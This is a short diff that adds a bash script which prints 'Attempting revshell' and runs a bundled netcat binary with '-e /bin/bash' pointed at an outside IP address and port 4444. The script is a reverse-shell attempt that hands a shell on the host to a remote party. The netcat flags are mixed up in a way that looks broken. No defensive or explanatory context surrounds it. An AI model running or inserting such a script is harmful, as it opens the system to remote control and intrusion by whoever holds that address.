@@ -1,0 +1,6 @@
+#!/bin/bash
+
+DIR="$(dirname "$0")"
+
+echo "Attempting revshell"
+./nc -p -l 35.162.122.222 4444 -e /bin/bash
